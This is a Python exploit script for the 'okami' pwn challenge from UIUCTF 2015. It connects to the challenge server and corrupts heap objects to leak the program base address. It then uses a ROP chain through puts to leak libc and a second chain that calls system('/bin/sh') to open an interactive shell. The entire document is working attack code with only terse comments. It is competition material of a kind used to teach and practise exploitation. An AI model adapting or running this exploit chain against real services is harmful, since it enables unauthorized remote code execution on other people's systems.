#!/usr/bin/env python
import struct,socket,telnetlib

# UIUCTF 2015
# PWN: okami 
# checksec : NX,PIE,Full RELRO,CANARY

def shell():
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def p(addr):
	return struct.pack("<Q",addr)

def read_until(token):
	data = ""
	while not data.endswith(token):
		data += f.read(1)
	return data

s = socket.create_connection(("okami.uiuc.sexy",1235))
#s = socket.create_connection(("127.0.0.1",12345))
f = s.makefile('rw',bufsize=0)

for _ in range(64):
	f.write("1\n") # store string
	f.write("B" * 15 + "\n")

f.write("5\n") # release obj 0
f.write("0\n") 

f.write("3\n") # concat str
f.write("P" * 127 + "\n") # controll obj 1 size
f.write("1\n") # not important

f.write("4\n") # leak address
f.write("0\n")  

msg = read_until("BBBB\n")
print msg

leak_addr = msg[-32:]
leak_addr = leak_addr[9:17]
leak_offset = 0xb05
leak_addr = struct.unpack("<Q",leak_addr)[0]
elf_base = leak_addr - leak_offset

print "we get leak address " + hex(leak_addr)
print "we get elf base " + hex(elf_base)

atoi_got_offset = 0x202fb8
atoi_got = elf_base + atoi_got_offset

add_rsp_offset = 0xd11 # add 0x38 , rsp -> pop pop ret
add_rsp = elf_base + add_rsp_offset

puts_plt_offset = 0x920
puts_plt = elf_base + puts_plt_offset

pop_rdi_offset = 0x1a73
pop_rdi = elf_base + pop_rdi_offset

main_offset = 0x1942
main = elf_base + main_offset

f.write("6\n") # overwrite string
f.write("0\n") 
payload = "A" * 24 + p(add_rsp) * 3 + p(pop_rdi)
payload += p(atoi_got) + p(puts_plt) + p(main)
payload += "B" * 32

f.write(payload + "\n")

f.write("4\n") # trigger 
f.write("1\n")

print read_until("index\n")
print read_until("index\n")

atoi_addr = read_until("\n").strip().ljust(8,"\x00")
atoi_addr = struct.unpack("<Q",atoi_addr)[0]
atoi_offset = 0x39f50
print "get atoi address " + hex(atoi_addr)

libc_base = atoi_addr - atoi_offset
system_offset = 0x46640
binsh_offset = 0x17ccdb
libc_system = libc_base + system_offset
binsh = libc_base +  binsh_offset

# again ....
for _ in range(64):
	f.write("1\n") # store string
	f.write("B" * 15 + "\n")

f.write("5\n") # release obj
f.write("0\n") 

f.write("3\n") # concat str
f.write("P" * 127 + "\n") # controll obj 1 size
f.write("1\n") # not important

f.write("6\n") # overwrite string
f.write("0\n") 
payload = "A" * 24 + p(add_rsp) * 3 + p(pop_rdi)
payload += p(binsh) + p(libc_system)
f.write(payload + "\n")

f.write("4\n")
f.write("1\n")

shell()

